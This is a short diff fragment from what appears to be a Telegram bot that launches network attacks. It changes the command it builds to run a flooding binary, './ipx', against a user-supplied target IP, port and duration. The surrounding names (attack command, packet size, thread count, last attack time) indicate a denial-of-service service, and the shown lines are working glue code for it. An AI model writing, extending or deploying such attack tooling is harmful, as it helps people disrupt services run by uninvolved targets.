@@ -342,7 +342,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         update_last_attack_time(user_id)
 
         # Construct command for Kala binary with thread count and packet size
-        command = f"./Razeem {target_ip} {target_port} {duration} {packet_size} {thread_count}"
+        command = f"./ipx {target_ip} {target_port} {duration} 600"
 
         # Send initial attack message
         bot.send_message(chat_id, 
